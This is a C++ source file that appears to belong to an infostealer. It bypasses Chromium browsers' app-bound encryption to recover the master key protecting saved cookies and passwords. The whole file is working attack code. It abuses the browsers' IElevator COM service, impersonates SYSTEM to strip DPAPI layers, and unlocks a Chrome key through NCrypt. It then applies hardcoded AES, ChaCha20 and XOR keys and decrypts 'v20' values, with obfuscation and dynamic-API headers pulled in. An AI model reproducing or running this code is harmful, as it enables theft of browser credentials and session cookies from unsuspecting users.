#include "AppBound.h"
#include "Config.h"
#include "../core/Obfuscation.h"
#include "Crypto.h"
#include "DynamicAPI.h"
#include "Impersonator.h"
#include "../../DebugLog.h"
#include <bcrypt.h>
#include <comdef.h>
namespace AppBound {
    struct BrowserCLSID {
        CLSID clsid;
        IID   iid;
    };
    static const BrowserCLSID g_BrowserCLSIDs[] = {
        { {0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}},
          {0xA949CB4E,0xC4F9,0x44C4,{0xB2,0x13,0x6B,0xF8,0xAA,0x9A,0xC6,0x9C}} },
        { {0xDD2646BA,0x3707,0x4BF8,{0xB9,0xA7,0x03,0x86,0x91,0xA6,0x8F,0xC2}},
          {0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B}} },
        { {0xDA7FDCA5,0x2CAA,0x4637,{0xAA,0x17,0x07,0x40,0x58,0x4D,0xE7,0xDA}},
          {0x42D4A4CF,0xAE6A,0x4B4F,{0xA8,0xD5,0xBC,0x4C,0x45,0xAC,0x75,0x7A}} },
        { {0x704C2872,0x2049,0x435E,{0xA4,0x69,0x0A,0x53,0x43,0x13,0xC4,0x2B}},
          {0x89D73AE1,0xBFEF,0x4B5A,{0x9F,0x7E,0xDB,0xC7,0x3E,0x00,0x59,0xFA}} },
        { {0x1FCBE96C,0x1697,0x43AF,{0x9A,0x40,0x80,0xD9,0x66,0x31,0xE5,0x9B}},
          {0x1F4DE4B7,0xC285,0x4A1F,{0x98,0x84,0x2C,0x7F,0x45,0xF9,0x4E,0x0E}} },
    };
    std::vector<BYTE> DecryptAppBoundKey(const std::vector<BYTE>& ciphertext) {
        if (ciphertext.empty()) return {};
        CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
        const BYTE* data = ciphertext.data();
        size_t dataLen   = ciphertext.size();
        std::vector<BYTE> decrypted;
        for (const auto& entry : g_BrowserCLSIDs) {
            IElevator* pElevator = nullptr;
            HRESULT hr = CoCreateInstance(entry.clsid, nullptr, CLSCTX_LOCAL_SERVER, entry.iid, (void**)&pElevator);
            if (FAILED(hr) || !pElevator) continue;
            BSTR bCipher = SysAllocStringByteLen(reinterpret_cast<const char*>(data), (UINT)dataLen);
            BSTR bPlain  = nullptr;
            DWORD lastErr = 0;
            hr = pElevator->DecryptData(bCipher, &bPlain, &lastErr);
            SysFreeString(bCipher);
            if (SUCCEEDED(hr) && bPlain) {
                UINT len = SysStringByteLen(bPlain);
                decrypted.assign(reinterpret_cast<BYTE*>(bPlain), reinterpret_cast<BYTE*>(bPlain) + len);
                SysFreeString(bPlain);
                pElevator->Release();
                CoUninitialize();
                return decrypted;
            }
            SysFreeString(bPlain);
            pElevator->Release();
        }
        CoUninitialize();
        return {};
    }
    struct KeyBlob {
        BYTE flag;
        std::vector<BYTE> encrypted_aes_key;
        std::vector<BYTE> iv;
        std::vector<BYTE> ciphertext;
        std::vector<BYTE> tag;
    };
    static KeyBlob ParseKeyBlob(const std::vector<BYTE>& data) {
        if (data.size() < 16) return {};
        char hex[64] = { 0 };
        for (int i = 0; i < 16 && i < data.size(); i++) sprintf(hex + i * 3, "%02X ", data[i]);
        SLOG("    [*] Layer 2 Hex (first 16): %s", hex);
        KeyBlob blob;
        if (data.size() >= 93) {
            size_t pos = data.size() - 93;
            if (data[pos] == 3) {
                blob.flag = 3; pos++;
                blob.encrypted_aes_key.assign(data.begin() + pos, data.begin() + pos + 32); pos += 32;
                blob.iv.assign(data.begin() + pos, data.begin() + pos + 12); pos += 12;
                blob.ciphertext.assign(data.begin() + pos, data.begin() + pos + 32); pos += 32;
                blob.tag.assign(data.begin() + pos, data.begin() + pos + 16);
                SLOG("    [+] Found Flag 3 at offset %zu", data.size() - 93);
                return blob;
            }
        }
        if (data.size() >= 61) {
            size_t pos = data.size() - 61;
            if (data[pos] == 1 || data[pos] == 2) {
                blob.flag = data[pos]; pos++;
                blob.iv.assign(data.begin() + pos, data.begin() + pos + 12); pos += 12;
                blob.ciphertext.assign(data.begin() + pos, data.begin() + pos + 32); pos += 32;
                blob.tag.assign(data.begin() + pos, data.begin() + pos + 16);
                SLOG("    [+] Found Flag %u at offset %zu", blob.flag, data.size() - 61);
                return blob;
            }
        }
        SLOG("    [-] Failed to find valid v20 flag at expected offsets.");
        return {};
    }
    static std::vector<BYTE> NCryptDecryptKey(const std::vector<BYTE>& input) {
        if (!DynAPI::NCryptOpenStorage || !DynAPI::NCryptOpenK || !DynAPI::NCryptDecr) return {};
        NCRYPT_PROV_HANDLE hProv = NULL;
        SECURITY_STATUS status = DynAPI::NCryptOpenStorage(&hProv, L"Microsoft Software Key Storage Provider", 0);
        if (status != 0) return {};
        NCRYPT_KEY_HANDLE hKey = NULL;
        status = DynAPI::NCryptOpenK(hProv, &hKey, L"Google Chromekey1", 0, 0);
        if (status != 0) {
            DynAPI::NCryptFreeObj(hProv);
            return {};
        }
        DWORD outSize = 0;
        std::vector<BYTE> output;
        status = DynAPI::NCryptDecr(hKey, const_cast<BYTE*>(input.data()), (DWORD)input.size(), NULL, NULL, 0, &outSize, 0x40 );
        if (status == 0 && outSize > 0) {
            output.resize(outSize);
            status = DynAPI::NCryptDecr(hKey, const_cast<BYTE*>(input.data()), (DWORD)input.size(), NULL, output.data(), (DWORD)output.size(), &outSize, 0x40);
        }
        DynAPI::NCryptFreeObj(hKey);
        DynAPI::NCryptFreeObj(hProv);
        if (status == 0) return output;
        return {};
    }
    std::vector<BYTE> DeriveV20MasterKey(const std::vector<BYTE>& encryptedKeyBlob) {
        if (encryptedKeyBlob.empty()) return {};
        SLOG("    [*] Starting v20 Master Key derivation...");
        std::string layer1;
        {
            Utils::Impersonator imp;
            if (imp.IsImpersonating()) {
                layer1 = Crypto::DecryptDPAPI(encryptedKeyBlob);
            } else {
                SLOG("    [-] Impersonation failed, cannot perform SYSTEM DPAPI decryption.");
            }
        }
        if (layer1.empty()) {
            SLOG("    [-] Layer 1 (SYSTEM DPAPI) failed.");
            return {};
        }
        SLOG("    [+] Layer 1 decrypted. Size: %zu", layer1.size());
        std::vector<BYTE> layer1Vec(layer1.begin(), layer1.end());
        std::string layer2 = Crypto::DecryptDPAPI(layer1Vec);
        if (layer2.empty()) {
            SLOG("    [-] Layer 2 (User DPAPI) failed.");
            return {};
        }
        SLOG("    [+] Layer 2 decrypted. Size: %zu", layer2.size());
        std::vector<BYTE> layer2Vec(layer2.begin(), layer2.end());
        KeyBlob blob = ParseKeyBlob(layer2Vec);
        SLOG("    [*] Key blob parsed. Flag: %u", blob.flag);
        std::vector<BYTE> finalKey;
        if (blob.flag == 1) {
            std::vector<BYTE> aesKey = {0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87};
            finalKey = Crypto::DecryptAES_GCM(aesKey, blob.iv, {}, blob.ciphertext, blob.tag);
        } else if (blob.flag == 2) {
            std::vector<BYTE> chachaKey = {0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60};
            finalKey = Crypto::DecryptChaCha20Poly1305(chachaKey, blob.iv, {}, blob.ciphertext, blob.tag);
        } else if (blob.flag == 3) {
            std::vector<BYTE> decKey;
            {
                Utils::Impersonator imp;
                if (imp.IsImpersonating()) {
                    decKey = NCryptDecryptKey(blob.encrypted_aes_key);
                } else {
                    SLOG("    [-] Impersonation failed for NCrypt decryption.");
                }
            }
            if (decKey.size() == 32) {
                SLOG("    [+] NCrypt decrypted AES key successfully.");
                std::vector<BYTE> xorKey = {0xCC,0xF8,0xA1,0xCE,0xC5,0x66,0x05,0xB8,0x51,0x75,0x52,0xBA,0x1A,0x2D,0x06,0x1C,0x03,0xA2,0x9E,0x90,0x27,0x4F,0xB2,0xFC,0xF5,0x9B,0xA4,0xB7,0x5C,0x39,0x23,0x90};
                std::vector<BYTE> realKey(32);
                for (int i = 0; i < 32; ++i) realKey[i] = decKey[i] ^ xorKey[i];
                finalKey = Crypto::DecryptAES_GCM(realKey, blob.iv, {}, blob.ciphertext, blob.tag);
            } else {
                SLOG("    [-] NCrypt decryption failed or returned invalid size: %zu", decKey.size());
            }
        } else {
            SLOG("    [-] Unknown v20 flag: %u", blob.flag);
        }
        if (finalKey.empty()) {
            SLOG("    [-] Final decryption of Master Key failed.");
        } else {
            SLOG("    [+] Final Master Key recovered!");
        }
        return finalKey;
    }
    std::string DecryptAppBoundValue(const std::vector<BYTE>& encrypted, const std::vector<BYTE>& appBoundKey) {
        if (encrypted.size() < 31) return "";
        if (encrypted[0] != 'v' || encrypted[1] != '2' || encrypted[2] != '0') return "";
        std::vector<BYTE> iv(encrypted.begin() + 3, encrypted.begin() + 15);
        std::vector<BYTE> payload(encrypted.begin() + 15, encrypted.end());
        if (payload.size() < 16) return "";
        std::vector<BYTE> ciphertext(payload.begin(), payload.end() - 16);
        std::vector<BYTE> tag(payload.end() - 16, payload.end());
        auto dec = Crypto::DecryptAES_GCM(appBoundKey, iv, {}, ciphertext, tag);
        return std::string(dec.begin(), dec.end());
    }
}
